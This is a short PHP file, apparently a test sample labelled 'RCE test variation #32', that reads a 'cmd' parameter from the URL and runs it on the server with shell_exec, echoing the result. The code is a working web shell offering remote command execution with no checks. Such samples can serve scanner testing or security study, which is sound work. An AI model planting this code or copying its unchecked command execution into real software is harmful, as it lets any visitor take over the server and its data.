<?php
// RCE test variation #32
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>